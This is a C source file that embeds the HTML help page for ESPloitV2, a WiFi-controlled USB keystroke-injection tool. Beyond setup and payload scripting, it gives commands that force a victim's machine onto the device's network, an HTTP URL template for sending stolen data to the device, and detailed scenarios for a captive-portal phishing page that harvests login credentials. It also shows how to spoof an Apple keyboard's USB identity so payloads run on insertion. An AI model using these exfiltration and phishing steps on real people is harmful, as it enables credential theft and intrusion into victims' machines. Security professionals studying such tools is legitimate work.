const char HelpText[] PROGMEM = R"=====(
<!DOCTYPE HTML>
<html>
<head><title>ESPloit Help Page</title></head>
<body>
<a href="/esploit"><- BACK TO INDEX</a><br><br>
-----<br>
HELP<br>
-----<br>
<br>
ESPloitV2<br>
<br>
Created by Corey Harding<br>
www.LegacySecurityGroup.com / www.Exploit.Agency<br>
https://github.com/exploitagency/ESPloitV2<br>
<br>
ESPloit is a WiFi controlled HID Keyboard Emulator similar to the USB Rubber Ducky by Hak5. This version was created specifically for the Cactus WHID which is a USB stick that utilizes an ESP-12S WiFi module with a serial connection to a 32u4 microcontroller. The device has 4M of flash storage more than capable of storing the firmware and a number of payloads. Unlike the Rubber Ducky this device has WiFi allowing the device to host its own access point or connect to an existing network. This allows users to upload and pick between payloads or even type out "live payloads" without uploading a file, and like the Rubber Ducky, ESPloit allows you to set up a payload to run upon insertion of the device. The device also supports upgrading the firmware over WiFi, deleting payloads, reformatting the file system, WiFi and basic configuration, and more.<br>
<br>
ESPloit is distributed under the MIT License. The license and copyright notice can not be removed and must be distributed alongside all future copies of the software.<br>
<br>
-----<br>
Initial Flashing<br>
-----<br>
<br>
Download and Install the Arduino IDE from http://www.Arduino.cc<br>
Open Arduino IDE.<br>
Go to File - Preferences. Locate the field "Additional Board Manager URLs:"<br>
Add "http://arduino.esp8266.com/stable/package_esp8266com_index.json" without quotes. Click "Ok"<br>
Select Tools - Board - Boards Manager. Search for "esp8266".<br>
Install "esp8266 by ESP8266 community version 2.3.0". Click "Close".<br>
Select Sketch - Include Library - Manage Libraries. Search for "Json".<br>
Install "ArduinoJson by Benoit Blanchon version 5.11.0" and click "Close"<br>
Download https://github.com/exploitagency/esp8266FTPServer/archive/feature/bbx10_speedup.zip<br>
Click Sketch - Include Library - Add .ZIP Library and select bbx10_speedup.zip from your Downloads folder.<br>
The Arduino IDE is now configured and ready for the code.<br>
<br>
Use git to clone this repo: https://github.com/exploitagency/ESPloitV2.git<br>
or<br>
Download/extract the repo as a zip file: https://github.com/exploitagency/ESPloitV2/archive/master.zip<br>
<br>
Load the esp8266Programmer sketch from the flashing folder.<br>
Select Tools - Board - "LilyPad Arduino USB".<br>
Select the Port your device is connected to under Tools - Port.<br>
Upload the sketch.<br>
<br>
Open the ESP_Code sketch from the source folder.<br>
Select Tools - Board - "Generic ESP8266 Module".<br>
Select Tools - Flash Size - "4M (3M SPIFFS)".<br>
Select Sketch - "Export Compiled Binary".<br>
<br>
Now flash the firmware to the ESP-12S chip using one of the following tools.<br>
Linux: https://github.com/AprilBrother/esptool<br>
Example: python esptool.py --port=/dev/ttyACM0 --baud 115000 write_flash 0x00000 ESP_Code.ino.generic.bin --flash_size 32m<br>
Windows: https://github.com/nodemcu/nodemcu-flasher<br>
<br>
NOTE: Do not try to connect to the access point or test anything yet, the device won't work until after the next step.<br>
<br>
Finally open the Arduino_32u4_code sketch from the source folder.<br>
Select Tools - Board - "LilyPad Arduino USB".<br>
Select the Port your device is connected to under Tools - Port.<br>
Upload the sketch.<br>
<br>
Your ESPloit is now ready to configure and or use.<br>
<br>
-----<br>
Initial configuration<br>
-----<br>
<br>
ESPloit by default creates an Access Point with the SSID "Exploit" with a password of "DotAgency".<br>
Connect to this access point and open a web browser pointed to "http://192.168.1.1"<br>
You are now greeted with the main menu of ESPloit. From here there are several options.<br>
<br>
Upload Payload: Upload a payload.txt file<br>
Choose Payload: Choose a payload to run<br>
Live Payload Mode: Type out or copy/paste a payload to run without uploading<br>
Input Mode: Use the device as a keyboard/mouse substitute<br>
Duckuino Mode: Convert and optionally run Ducky Script payloads to ESPloit compatible script<br>
Configure ESPloit: Configure WiFi and basic settings<br>
List Exfiltrated Data: Lists any exfiltrated data<br>
Format File System: Format the file system<br>
Upgrade ESPloit Firmware: Upgrade the ESP-12S ESPloit firmware from a web browser<br>
Help: Brings up this help file<br>
<br>
The default administration username is "admin" and password "hacktheplanet". This username and password is used to Configure ESPloit or to Upgrade the Firmware.<br>
<br>
-----<br>
Resetting to default configuration/Recovering device<br>
-----<br>
<br>
Plug the device into your computer.<br>
Open the Arduino IDE.<br>
Select Tools - Board - "LilyPad Arduino USB".<br>
Select Tools - Port and the port the device is connected to.<br>
Select Tools - "Serial Monitor".<br>
Select "38400 baud".<br>
Now type in "ResetDefaultConfig:". Without the quotes but be sure to include the colon symbol.<br>
Click Send.<br>
You should now receive the following reply "Resetting configuration files back to default settings."<br>
Wait about 15 seconds or until the LED blinks and unplug and replug in the device.<br>
The device has now been reset back to default settings.<br>
Connect to the Access Point with the SSID "Exploit" with a password of "DotAgency".<br>
Open a web browser pointed to "http://192.168.1.1"<br>
The default administration username is "admin" and password "hacktheplanet".<br>
<br>
NOTE: Certain devices seem to have trouble connecting to a password protected ESP8266 access point. The symptoms of this involve repeatedly being prompted to enter the password and being unable to connect to the ESP8266 via WiFi. This can be solved by following the above instructions but instead issuing the command "ResetDefaultConfig:OpenNetwork" via serial. The device will be restored to the factory defaults(with the exception of now being an unsecured network). The device will reboot and you may now connect to it as an unsecured WiFi access point with an SSID of "Exploit". You should now be able to establish a connection.<br>
<br>
-----<br>
Configure ESPloit<br>
-----<br>
<br>
Default credentials to access the configuration page:<br>
username "admin"<br>
password "hacktheplanet"<br>
<br>
WiFi Configuration<br>
<br>
Network Type<br>
Access Point Mode: Create a standalone access point(No Internet Connectivity-Requires Close Proximity)<br>
Join Existing Network: Join an existing network(Possible Internet Connectivity-Could use Device Remotely)<br>
<br>
Hidden: Choose whether or not to use a hidden SSID when creating an access point<br>
<br>
SSID: SSID of the access point to create or of the network you are choosing to join<br>
Password: Password of the access point which you wish to create or of the network you are choosing to join<br>
Channel: Channel of the access point you are creating<br>
<br>
IP: IP to set for ESPloit<br>
Gateway: Gateway to use, make it the same as ESPloit's IP if an access point or the same as the router if joining a network<br>
Subnet: Typically set to 255.255.255.0<br>
<br>
ESPloit Administration Settings:<br>
<br>
Username: Username to configure/upgrade ESPloit<br>
Password: Password to configure/upgrade ESPloit<br>
<br>
Payload Settings<br>
<br>
Delay Between Sending Lines of Code in Payload: Delay in milliseconds between sending lines from payload or when manually inserting a "DELAY" in the payload(Default: 2000)<br>
<br>
Automatically Deploy Payload Upon Insetion: Choose Yes or No to automatically deploy a payload when inserting the device<br>
<br>
Automatic Payload: Choose the location of the payload to run upon insertion<br>
<br>
-----<br>
Scripting a Payload<br>
-----<br>
<br>
ESPloit uses its own scripting language and not Ducky Script,<br>
although a Ducky Script to ESPloit converter is available in the Duckuino Mode page<br>
<br>
Examples of ESPloit's scripting language can be seen below.<br>
<br>
COMMANDS ARE CASE SENSITIVE! Do not insert any spaces after a command unless intentional and as part of a string, etc.  Do not place any blank lines in a payload!<br>
<br>
Commenting code:<br>
--"Rem: Comment"<br>
--Set comments<br>
<br>
Set the default delay for a specific payload:<br>
--"DefaultDelay:X"<br>
--Overrides the default delay set in the ESPloit configuration portal but only for this specific payload<br>
--Delay is in milliseconds and defined as the wait between sending lines in the payload<br>
--Example: "DefaultDelay:10000" will wait 10 seconds between sending each line in the payload<br>
<br>
Set a one time delay between sending lines in payload<br>
--"CustomDelay:X"<br>
--The default delay will still apply for all other lines except this one<br>
--Example: "CustomDelay:5000" will ignore the default delay for this line and waits 5 seconds before sending the next line in the payload<br>
<br>
To make a generic delay:<br>
-"Delay"<br>
--"Delay" would wait for The Default Delay x 2 before proceeding to next item in payload<br>
<br>
For individual keypresses or combinations of key presses:<br>
-"Press:X" or "Press:X+Y" or "Press:X+Y+Z" and so forth<br>
--Expects Decimal Key Code Values for X,Y,Z,etc<br>
--Sending the following "Press:131+114" with the device's USB plugged into a Windows machine would output KEY_LEFT_GUI(Windows_Key)+r thus launching the RUN prompt<br>
--List of modifier keys(GUI,ALT,CTRL,ETC) at https://www.arduino.cc/en/Reference/KeyboardModifiers<br>
--ASCII table lookup at http://www.asciitable.com/<br>
<br>
To type out strings of text:<br>
-"Print:XYZ" Types out "XYZ"<br>
--Sending the following via software serial "Print:www.Exploit.Agency" would type out "www.Exploit.Agency" on the machine connected via USB<br>
<br>
To type out strings of text and presses ENTER:<br>
-"PrintLine:XYZ" Types out "XYZ" then presses ENTER<br>
--Sending the following "PrintLine:www.Exploit.Agency" would type out "www.Exploit.Agency" on the machine connected via USB and then would press and release the ENTER key<br>
<br>
Move Mouse:<br>
--"MouseMoveUp:X", "MouseMoveDown:X", "MouseMoveLeft:X", "MouseMoveRight:X"<br>
--Valid range of values for X is 1-127<br>
--Moves mouse up, down, left, or right by X amount<br>
--X must be a number<br>
<br>
Mouse Click:<br>
--"MouseClickLEFT:", "MouseClickRIGHT:", "MouseClickMIDDLE:"<br>
--Clicks the LEFT, RIGHT, or MIDDLE mouse button<br>
--Case Sensitive<br>
<br>
Blink LED:<br>
--"BlinkLED:X"<br>
--X=# of times to blink the LED 750ms ON 500ms OFF<br>
--"BlinkLED:3" Blinks the LED 3 times<br>
--Useful for knowing what stage of a payload you are on(add to the end of payload).<br>
<br>
Special Characters/Known Issues:<br>
Currently the only character that has been found not to work is the "less than" symbol, "&lt;".<br>
This bug does NOT apply to Live Payload Mode.<br>
This only applies if you are using Upload Payload, the script will stop uploading when it reaches the "&lt;" symbol.<br>
The work around for writing a script that requires a "&lt;" is to replace all instances of "&lt;" with "&amp;lt;".<br>
The script will upload properly and when viewed and/or ran it will replace "&amp;lt;" with "&lt;".<br>
<br>
-----<br>
Uploading a Payload<br>
-----<br>
<br>
Click browse and choose a payload to upload.<br>
<br>
Names should not contain any special characters and should stick to letters and numbers only.<br>
<br>
Names must be shorter than 21 characters. The SPIFFS file system used has a 31 character limit, 10 characters are used for the folder structure "/payloads/".<br>
<br>
You may save several characters by naming payloads without using an extension.<br>
<br>
-----<br>
Choose a Payload<br>
-----<br>
<br>
This is a list of all payloads that have been uploaded.<br>
<br>
You may click the payload name to see the contents of a payload.<br>
<br>
Click "Run Payload" to run the payload or click "Delete Payload" to delete the payload.<br>
<br>
The file size and filesystem information is also listed on this page.<br>
<br>
-----<br>
Live Payload Mode<br>
-----<br>
<br>
Here you may type out or copy/paste a payload to run without uploading.<br>
<br>
-----<br>
Input Mode<br>
-----<br>
<br>
Use the device as a keyboard/mouse substitute.<br>
<br>
-----<br>
Duckuino Mode<br>
-----<br>
<br>
Convert Ducky Script to ESPloit Script and then optionally run the script.<br>
Paste Ducky Script on the text area to the left.<br>
Click convert and the ESPloit compatible script appears on the right.<br>
<br>
-----<br>
List Exfiltrated Data<br>
-----<br>
<br>
Displays any data that has been collected from the victim using ESPloit's exfiltration methods.<br>
<br>
-----<br>
Format File System<br>
-----<br>
<br>
This will erase the contents of the SPIFFS file system including ALL Payloads that have been uploaded.<br>
Formatting may take up to 90 seconds.<br>
All current settings will be retained unless you reboot your device during this process.<br>
<br>
-----<br>
Upgrade ESPloit Firmware<br>
-----<br>
<br>
Authenticate using your username and password set in the configuration page.<br>
<br>
Default credentials to access the firmware upgrade page:<br>
username "admin"<br>
password "hacktheplanet"<br>
<br>
Select "Browse" choose the new firmware to be uploaded to the ESP-12S chip and then click "Upgrade".<br>
<br>
You will need to manually reset the device upon the browser alerting you that the upgrade was successful.<br>
<br>
If you are using this mode to swap the firmware loaded on the ESP-12S chip, and if the new firmware does not support this mode then you must reflash the ESP-12S manually by uploading the programmer sketch to the 32u4 chip and then flash the ESP-12S this way.
<br><br>
-----<br>
Exfiltrating Data<br>
-----<br>
<br>
Serial Exfiltration Method:<br>
Find the victims com port<br>
Set the baud rate to 38400 on victim machine<br>
Send the text "SerialEXFIL:" followed by the data to exfiltrate<br>
Exfiltrated data will be saved to the file SerialEXFIL.txt<br>
See the example payloads for more info<br>
<br>
WiFi Exfiltration Methods:<br>
To exfiltrate data using WiFi methods be sure ESPloit and Target machine are on the same network.<br>
Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.<br>
<br>
Example commands to force victim to connect to ESPloit's network(when set as AP):<br>
Windows: netsh wlan set hostednetwork mode=allow ssid="SSID-HERE" key="WIFI-PASSWORD-HERE"<br>
Linux: nmcli dev wifi connect SSID-HERE password WIFI-PASSWORD-HERE<br>
<br>
For HTTP exfiltration method point the target machine to the url listed below:<br>
http://ESPloit-IP-Here/exfiltrate?file=FILENAME.TXT&data=EXFILTRATED-DATA-HERE<br>
The victim is forced to access the URL above and now under "List Exfiltrated Data" you will see the file "FILENAME.TXT" containing the exfiltrated data "EXFILTRATED-DATA-HERE".<br>
<br>
For FTP exfiltration method use the credentials configured in the "Configure ESPloit" page. Also note that only Passive Mode FTP is supported.<br>
<br>
See the example payloads for more in depth examples.<br>
<br>
-----<br>
ESPortal Credential Harvester(Phisher)<br>
-----<br>
<br>
NOTE: Modifying any ESPortal related setting requires a reboot of the ESPloit device.<br>
When enabled ESPloit main menu will appear on http://IP-HERE/esploit<br>
Do not leave any line blank or as a duplicate of another.<br>
<br>
A social engineering attack vector.<br>
Redirects HTTP requests to a fake login page. 
Does not support HTTPS requests nor does it override cached HTTPS redirects.<br>
You can define a custom template for up to 3 specific domains, a welcome portal, and a catch-all.<br>
Captured credentials are stored on the exfiltration page in the file "esportal-log.txt".<br>
<br>
Example scenario 1: Target capturing login credentials from a specific domain name when victim connects to a fake free WiFi hotspot. Setup ESPloitV2 to act as a free WiFi hotspot(AP Mode, SSID: "Free WiFi", Open Network=Leave Password Blank). Set ESPortal to Enabled, Site 1 Domain(fakesite1.com). User now connects to the open network "Free WiFi", browses to fakesite1.com, they see a login prompt, user attempts to login, ESPortal gives an error, user gets frustrated and gives up. Meanwhile the credentials the user entered are logged and displayed on the Exfiltrated Data page in the file "esportal-log.txt". To make the attack even more effective I have included the ability for the attacker to make their own html templates for the login pages. If the user were to browse to another page not specified as a domain in the settings they will be greeted with a generic login prompt set from the spoof_other.html template.<br>
<br>
Example scenario 2: Thinking slightly outside of the box... ESPloit is connected the victims network(and is not in AP mode), in this example ESPloit's IP is 192.168.1.169, FTP mode is enabled. Under ESPortal settings set the Welcome Domain to the ESPloit's IP address(192.168.1.169) and set Welcome Page On(/login). Now upload a custom login template to ESPloit named welcome.html(do not use the included welcome.html template as that is simply a greeting and we want a login page so use and rename the included template spoof_other.html to welcome.html and upload it via FTP), here is a Linux example for uploading the custom template via FTP(curl -T spoof_other.html ftp://ftp-admin:hacktheplanet@192.168.1.169/welcome.html). Now when you browse to 192.168.1.169 you are redirected to a login prompt at 192.168.1.169/login. You can now create a payload to open this webpage on the victims pc and customize the template to whatever you want. Even though there are easier ways you could use it to capture user login credentials from the victim PC, so you could fullscreen the browser window and make the custom html template look like the PC's lock screen. Or you could make it look like a login page for a website for which you wish to phish credentials. It could also be used to hide ESPloit's admin panel, perhaps when a user browses to ESPloit's IP they go to a "corporate server login page" which user is not authorized to access, remember in ESPortal mode ESPloit's admin panel shows up on http://esploitIP/esploit vs being able to access it from the default http://esploitIP when ESPortal mode is disabled. Remember social engineering is all about being creative.<br>
<br>
Custom html templates can be uploaded for the ESPortal login credential harvester via FTP(PASV Mode only).<br>
If a custom html template is found it will override the default settings.<br>
Upon deletion the default settings are automatically restored.<br>
<br>
The filenames must match the below exactly in order to apply a template override.<br>
captiveportal.html     -     The catch all that handles the redirects.(Would be rare to override this part)<br>
welcome.html           -     The welcome page for the "free wifi" hotspot.<br>
spoof_other.html       -     The generic login credential harvester for a site not in the list.<br>
spoof_site1.html       -     The 1st login credential harvester site in the list with a custom layout.<br>
spoof_site2.html       -     The 2nd login credential harvester site in the list with a custom layout.<br>
spoof_site3.html       -     The 3rd login credential harvester site in the list with a custom layout.<br>
error.html             -     Display some sort of custom error when the user enters login credentials.<br>
<br>
-----<br>
Changing the VID/PID<br>
-----<br>
<br>
WARNING! This information is being provided for educational purposes only, it is illegal to use a VID/PID that you do not own.<br>
<br>
Find and edit boards.txt, it may be located somewhere similar to<br>
Linux: /root/.arduino15/packages/arduino/hardware/avr/1.6.19/<br>
or<br>
Windows: C:\Users\USER\AppData\Local\Arduino15\packages\arduino\hardware\avr\1.6.19\<br>
<br>
Add the below quote to the end of the boards.txt file.<br>
RESTART THE ARDUINO IDE!<br>
Now select Cactus WHID under Tools - Boards instead of LilyPad Arduino USB when you upload the Arduino_32u4_Code sketch.<br>
<pre style="color:#808080";>
    ##############################################################

    CactusWHID.name=Cactus WHID
    CactusWHID.vid.0=0x1B4F
    CactusWHID.pid.0=0x9207
    CactusWHID.vid.1=0x1B4F
    CactusWHID.pid.1=0x9208

    CactusWHID.upload.tool=avrdude
    CactusWHID.upload.protocol=avr109
    CactusWHID.upload.maximum_size=28672
    CactusWHID.upload.maximum_data_size=2560
    CactusWHID.upload.speed=57600
    CactusWHID.upload.disable_flushing=true
    CactusWHID.upload.use_1200bps_touch=true
    CactusWHID.upload.wait_for_upload_port=true

    CactusWHID.bootloader.tool=avrdude
    CactusWHID.bootloader.low_fuses=0xff
    CactusWHID.bootloader.high_fuses=0xd8
    CactusWHID.bootloader.extended_fuses=0xce
    CactusWHID.bootloader.file=caterina-LilyPadUSB/Caterina-LilyPadUSB.hex
    CactusWHID.bootloader.unlock_bits=0x3F
    CactusWHID.bootloader.lock_bits=0x2F

    CactusWHID.build.mcu=atmega32u4
    CactusWHID.build.f_cpu=8000000L
    CactusWHID.build.vid=0x0000
    CactusWHID.build.pid=0xFFFF
    CactusWHID.build.usb_product="Cactus WHID"
    CactusWHID.build.usb_manufacturer="April Brother"
    CactusWHID.build.board=AVR_LILYPAD_USB
    CactusWHID.build.core=arduino
    CactusWHID.build.variant=leonardo
    CactusWHID.build.extra_flags={build.usb_flags}
</pre>
<br>
Replace this portion with your spoofed VID/PID.<br>
"0x0000" and "0xFFFF" are only placeholders and should not be used.<br>
Replace these with your own personal VID/PID combination<br>
<pre style="color:#808080";>
    CactusWHID.build.vid=0x0000
    CactusWHID.build.pid=0xFFFF
    CactusWHID.build.usb_product="Cactus WHID"
    CactusWHID.build.usb_manufacturer="April Brother"
</pre>
<br>
On Apple Devices you can theoretically bypass the unknown keyboard hurdle by spoofing an Apple VID/PID.<br>
This will run the payload upon insertion vs having to identify the keyboard first.<br>
DO NOT DO THIS! It is illegal to use a VID/PID that you do not own.<br>
<pre style="color:#808080";>
    CactusWHID.build.vid=0x05ac
    CactusWHID.build.pid=0x021e
    CactusWHID.build.usb_product="Aluminum Keyboard IT USB"
    CactusWHID.build.usb_manufacturer="Apple Inc."
</pre>
<br>
-----<br>
Changing the Keyboard Locale<br>
-----<br>
<br>
This is an easy to use solution from BlueArduino20 that is based off the work from NURRL at <a href="https://github.com/Nurrl/LocaleKeyboard.js" target="_blank">https://github.com/Nurrl/LocaleKeyboard.js</a><br>
Linux: <a href="https://github.com/BlueArduino20/LocaleKeyboard.SH" target="_blank">https://github.com/BlueArduino20/LocaleKeyboard.SH</a><br>
Windows: <a href="https://github.com/BlueArduino20/LocaleKeyboard.BAT" target="_blank">https://github.com/BlueArduino20/LocaleKeyboard.BAT</a><br>
<br>
-----<br>
Licensing Information<br>
-----<br>
<br>
Cactus WHID manufactured by April Brother: https://aprbrother.com<br>
Cactus WHID hardware design by Luca Bongiorni: http://whid.ninja<br>
<br>
ESPloitV2 by Corey Harding: https://www.LegacySecurityGroup.com<br>
Code available at: https://github.com/exploitagency/ESPloitV2<br>
ESPloitV2 software is licensed under the MIT License<br>
/*<br>
 MIT License<br>
<br>
 Copyright (c) [2017] [Corey Harding]<br>
<br>
 Permission is hereby granted, free of charge, to any person obtaining a copy<br>
 of this software and associated documentation files (the "Software"), to deal<br>
 in the Software without restriction, including without limitation the rights<br>
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell<br>
 copies of the Software, and to permit persons to whom the Software is<br>
 furnished to do so, subject to the following conditions:<br>
<br>
 The above copyright notice and this permission notice shall be included in all<br>
 copies or substantial portions of the Software.<br>
<br>
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR<br>
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,<br>
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE<br>
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER<br>
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,<br>
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE<br>
 SOFTWARE.<br>
*/<br><br>
<a href="/license">Click here for additional licensing information</a>
</body>
</html>
)=====";
